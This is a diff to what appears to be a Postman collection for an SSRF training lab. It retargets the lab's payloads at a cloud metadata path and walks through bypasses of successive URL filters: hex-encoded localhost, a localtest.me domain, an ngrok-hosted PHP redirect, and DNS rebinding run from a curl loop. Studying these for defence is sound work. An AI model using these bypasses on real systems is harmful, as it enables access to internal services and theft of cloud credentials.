@@ -12,7 +12,7 @@
 				"method": "GET",
 				"header": [],
 				"url": {
-					"raw": "{{url}}/nodefense?url=http://127.0.0.1:8000/index.html",
+					"raw": "{{url}}/nodefense?url=http://127.0.0.1:1338/latest/meta-data",
 					"host": [
 						"{{url}}"
 					],
@@ -22,7 +22,7 @@
 					"query": [
 						{
 							"key": "url",
-							"value": "http://127.0.0.1:8000/index.html"
+							"value": "http://127.0.0.1:1338/latest/meta-data"
 						}
 					]
 				}
@@ -35,7 +35,7 @@
 				"method": "GET",
 				"header": [],
 				"url": {
-					"raw": "{{url}}/defense1?url=http://0x7f.0x0.0x0.0x1:8000/index.html",
+					"raw": "{{url}}/defense1?url=http://0x7f.0x0.0x0.0x1:1338/latest/meta-data",
 					"host": [
 						"{{url}}"
 					],
@@ -45,7 +45,7 @@
 					"query": [
 						{
 							"key": "url",
-							"value": "http://0x7f.0x0.0x0.0x1:8000/index.html",
+							"value": "http://0x7f.0x0.0x0.0x1:1338/latest/meta-data",
 							"description": "http://0x7f.0x0.0x0.0x1 - Hex encoding the localhost address should bypass this defense"
 						}
 					]
@@ -60,7 +60,7 @@
 				"method": "GET",
 				"header": [],
 				"url": {
-					"raw": "{{url}}/defense2?url=http://localtest.me:8000/index.html",
+					"raw": "{{url}}/defense2?url=http://localtest.me:1338/latest/meta-data",
 					"host": [
 						"{{url}}"
 					],
@@ -70,7 +70,7 @@
 					"query": [
 						{
 							"key": "url",
-							"value": "http://localtest.me:8000/index.html",
+							"value": "http://localtest.me:1338/latest/meta-data",
 							"description": "localtest.me domain resolve to 127.0.0.1, resulting in effectivly bypassing the defense"
 						}
 					]
@@ -99,7 +99,7 @@
 						}
 					]
 				},
-				"description": "**Defence**: Now, to mitigate the DNS pinning issue, developers can check if the hostname resolves to a private IP address by making a DNS query\n\n**Bypass**:  This mitigation can be defeated by using HTTP Redirection Bypass Technique.\n\n**The Technique**:\n\nCraft a PHP redirect file in a manner that, upon execution, redirects the traffic to the internal server instead of the intended destination. This method ensures that when the targeted server resolves the URL, it redirects to the internal server, effectively circumventing any mitigation measures.\n\n``` php\n\theader('Location: http://127.0.0.1:8000/index.html');\n?>\n\n```\n\nUse [ngrok](https://ngrok.com/) to host this redirect.php file. The final Payload should look like this:\n\n`https://3c5c-49-43-100-139.ngrok-free.app/redirect.php`"
+				"description": "**Defence**: Now, to mitigate the DNS pinning issue, developers can check if the hostname resolves to a private IP address by making a DNS query\n\n**Bypass**:  This mitigation can be defeated by using HTTP Redirection Bypass Technique.\n\n**The Technique**:\n\nCraft a PHP redirect file in a manner that, upon execution, redirects the traffic to the internal server instead of the intended destination. This method ensures that when the targeted server resolves the URL, it redirects to the internal server, effectively circumventing any mitigation measures.\n\n``` php\n\theader('Location: http://127.0.0.1:1338/latest/meta-data');\n?>\n\n```\n\nUse [ngrok](https://ngrok.com/) to host this redirect.php file. The final Payload should look like this:\n\n`https://3c5c-49-43-100-139.ngrok-free.app/redirect.php`"
 			},
 			"response": []
 		},
@@ -122,7 +122,7 @@
 				"method": "GET",
 				"header": [],
 				"url": {
-					"raw": "{{url}}/defense4?url=http://make-66.96.146.129-rebind-127.0.0.1-rr.1u.ms:8000/index.html",
+					"raw": "{{url}}/defense4?url=http://make-66.96.146.129-rebind-127.0.0.1-rr.1u.ms:1338/latest/meta-data",
 					"host": [
 						"{{url}}"
 					],
@@ -132,16 +132,16 @@
 					"query": [
 						{
 							"key": "url",
-							"value": "http://make-66.96.146.129-rebind-127.0.0.1-rr.1u.ms:8000/index.html"
+							"value": "http://make-66.96.146.129-rebind-127.0.0.1-rr.1u.ms:1338/latest/meta-data"
 						},
 						{
 							"key": "url",
-							"value": "http://make-127.0.0.1-rebind-66.96.146.129-rr.1u.ms:8000/index.html",
+							"value": "http://make-127.0.0.1-rebind-66.96.146.129-rr.1u.ms:1338/latest/meta-data",
 							"disabled": true
 						}
 					]
 				},
-				"description": "Defense: To prevent HTTP redirection bypass, developers disable redirection in requests made from the application to the Internet\n\n**Bypass**: HTTP rebinding techique to bypass the defense\n\n- Two DNS requests are made before an HTTP request is made to a target URL:\n    - Request 1: to check whether the host is pointing to a private IP address,\n    - Request 2: resolve the hostname to start a connection to the target server.\n- Attackers take advantage of this by providing a URL pointing to their own server and have their DNS server serve two different DNS responses.\n    - First Response: a public IP address to pass the first check,\n    - Second Response: A private IP address to achieve a request forgery to an internal service.\n\nYou can leverage: [http://1u.ms](http://1u.ms) to generate the Low TTL DNS that resolves to 2 different IP addresses when quried at 2 different times.\n\n``` bash\nfor ((i=1;i<=100;i++)); do curl --location '127.0.0.1:3000/defense4?url=http://make-66.96.146.129-rebind-127.0.0.1-rr.1u.ms:8000/index.html'; done\n\n\n```"
+				"description": "Defense: To prevent HTTP redirection bypass, developers disable redirection in requests made from the application to the Internet\n\n**Bypass**: HTTP rebinding techique to bypass the defense\n\n- Two DNS requests are made before an HTTP request is made to a target URL:\n    - Request 1: to check whether the host is pointing to a private IP address,\n    - Request 2: resolve the hostname to start a connection to the target server.\n- Attackers take advantage of this by providing a URL pointing to their own server and have their DNS server serve two different DNS responses.\n    - First Response: a public IP address to pass the first check,\n    - Second Response: A private IP address to achieve a request forgery to an internal service.\n\nYou can leverage: [http://1u.ms](http://1u.ms) to generate the Low TTL DNS that resolves to 2 different IP addresses when quried at 2 different times.\n\n``` bash\nfor ((i=1;i<=100;i++)); do curl --location '127.0.0.1:3000/defense4?url=http://make-66.96.146.129-rebind-127.0.0.1-rr.1u.ms:1338/latest/meta-data'; done\n\n\n```"
 			},
 			"response": []
 		}
